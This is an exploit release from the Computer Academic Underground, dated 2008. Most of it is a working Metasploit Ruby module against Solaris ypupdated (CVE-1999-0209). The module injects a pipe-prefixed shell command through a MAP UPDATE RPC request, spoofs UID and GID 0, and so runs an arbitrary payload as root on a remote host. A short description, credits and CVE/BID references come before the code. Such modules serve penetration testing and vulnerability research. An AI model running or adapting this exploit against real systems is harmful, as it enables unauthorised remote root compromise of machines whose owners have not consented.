                      ____      ____     __    __
                     /    \    /    \   |  |  |  |
        ----====####/  /\__\##/  /\  \##|  |##|  |####====----
                   |  |      |  |__|  | |  |  |  |
                   |  |  ___ |   __   | |  |  |  |
  ------======######\  \/  /#|  |##|  |#|  |##|  |######======------
                     \____/  |__|  |__|  \______/
                                                     
                    Computer Academic Underground
                        http://www.caughq.org
                            Exploit Code

===============/========================================================
Exploit ID:     CAU-EX-2008-0001
Release Date:   2008.04.04
Title:          ypupdated_exec.rb
Description:    Solaris ypupdated Command Execution
Tested:         Solaris x86/sparc 10, sparc 9, 8, 2.7
Attributes:     Remote, NULL Auth, Elevated Privileges, Metasploit
Exploit URL:    http://www.caughq.org/exploits/CAU-EX-2008-0001.txt
Author/Email:   I)ruid <druid (@) caughq.org>
===============/========================================================

Description
===========

This exploit targets a weakness in the way the ypupdated RPC application
uses the command shell when handling a MAP UPDATE request.  Extra
commands may be launched through this command shell, which runs as root
on the remote host, by passing commands in the format '|<command>'.


Credits
=======

Josh D. <mcpheea@cadvision.com> from Avalon Security Research is
credited with originally discovering this vulnerability.

This Metasploit exploit module was modeled after kcope's exploit
released to Milw0rm on 2008.03.20.


References
==========

http://osvdb.org/displayvuln.php?osvdb_id=11517
http://cve.mitre.org/cgi-bin/cvename.cgi?name=1999-0209
http://www.securityfocus.com/bid/1749/info
http://www.milw0rm.com/exploits/5282


Metasploit
==========

require 'msf/core'

module Msf

class Exploits::Solaris::Sunrpc::YPUpdateDExec < Msf::Exploit::Remote

	include Exploit::Remote::SunRPC

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Solaris ypupdated Command Execution',
			'Description'    => %q{
				This exploit targets a weakness in the way the ypupdated RPC
				application uses the command shell when handling a MAP UPDATE
				request.  Extra commands may be launched through this command
				shell, which runs as root on the remote host, by passing
				commands in the format '|<command>'.

				Vulnerable systems include Solaris 2.7, 8, 9, and 10, when
				ypupdated is started with the '-i' command-line option.
			},
			'Author'         => [ 'I)ruid <druid@caughq.org>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 4498 $',
			'References'     =>
				[
					['BID', '1749'],
					['CVE', '1999-0209'],
					['OSVDB', '11517'],
				],
			'Privileged'     => true,
			'Platform'       => ['unix', 'solaris'],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'    => 1024,
					'DisableNops' => true,
				},
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget' => 0
		))

		register_options(
			[
				OptString.new('HOSTNAME', [false, 'Remote hostname', 'localhost']),
				OptInt.new('GID', [false, 'GID to emulate', 0]),
				OptInt.new('UID', [false, 'UID to emulate', 0])
			], self.class
		)
	end

	def exploit
		hostname  = datastore['HOSTNAME']
		program   = 100028
		progver   = 1
		procedure = 1

		print_status 'Sending PortMap request for ypupdated program'
		pport = sunrpc_create('udp', program, progver)

		print_status "Sending MAP UPDATE request with command '#{payload.encoded}'"
		print_status 'Waiting for response...'
		sunrpc_authunix(hostname, datastore['UID'], datastore['GID'], [])
		command = '|' + payload.encoded
		msg = XDR.encode(command, 2, 0x78000000, 2, 0x78000000)
		sunrpc_call(procedure, msg)

		sunrpc_destroy

		print_good 'No Errors, appears to have succeeded!'
	rescue ::Rex::Proto::SunRPC::RPCTimeout
		print_status 'Warning: ' + $!
		print_status 'Exploit may or may not have succeeded.'
	end

end
end	